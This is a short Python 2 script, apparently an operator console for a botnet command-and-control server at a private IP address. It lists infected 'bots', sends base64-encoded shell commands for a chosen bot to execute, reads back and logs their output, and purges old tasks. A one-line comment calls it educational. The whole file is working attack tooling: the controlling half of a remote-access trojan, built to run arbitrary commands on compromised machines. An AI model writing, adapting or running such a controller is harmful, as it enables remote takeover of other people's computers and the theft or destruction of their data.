#!/usr/bin/python
# Building this utility to only work with linux
# Built for educational use only...

import base64
import urllib
import urllib2

c2server="http://172.16.216.132/view.php"
sleepTime = 10	# Sleep for 10 seconds between requests going to the c2server
log = open('log.txt','a')

def getExecuted():
	# This function gets the machine IDs that are in the database
	url = c2server + "?action=getExecuted"
	u = urllib2.urlopen(url)
	i = u.read()
	items = i.split('|')
	if items[1] == "Nothing":
		print "No commands executed to be return..."
		return "Nothing"
	else:
		print "Task ID: " + items[0] 
		print "Bot ID: " + items[1]
		print "$> " + base64.b64decode(items[2])
		print base64.b64decode(items[3])
		print
		# Record to a log file for future reference...
		log.write("BotID: " + items[1] + "\n")
		log.write("?> " + base64.b64decode(items[2]) + "\n")
		log.write(base64.b64decode(items[3]) + "\n\n")
		return items[1]
	return "Nothing"
	
def selectBot(botList):
	count = 1
	for b in botList:
		print str(count) + ". " + b
		count=count+1
	print
	select = raw_input("> ");
	botNumber = int(select) - 1
	return botList[botNumber]

def sendCommand(b):
	command = raw_input("Command> ")
	url = c2server + "?action=sendCommand&mID=" + b + "&httpCommand=" + base64.b64encode(command) 
	urllib2.urlopen(url).read()
	print
	print "Sent the command: " + command
	
def purgeOld():
	url = c2server + "?action=purge"
	urllib2.urlopen(url).read()
	print
	print "Sent command to purge old information."

def main():
	bots = []
	botSelected = 'None'
	while True:
		print
		print "C2 Server URL: " + c2server
		print "1. Get Executed Commands"
		print "2. Select Bot - Currently Selected: " + botSelected
		print "3. Send Command to Execute"
		print "9. Purge Old Commands"
		print "Q. Quit"
		print
		selection = raw_input("> ")
		if selection == "1":
			newBot = getExecuted()
			if newBot <> "Nothing":
				if newBot not in bots: 
					bots.append(newBot)
					print "Added bot: " + newBot
		elif selection == "2":
			botSelected = selectBot(bots)
		elif selection == "3":
			sendCommand(botSelected)
		elif selection == "9":
			purgeOld()
		elif selection.lower() == "q":
			log.close()
			exit(0)

if __name__ == "__main__":
	main()
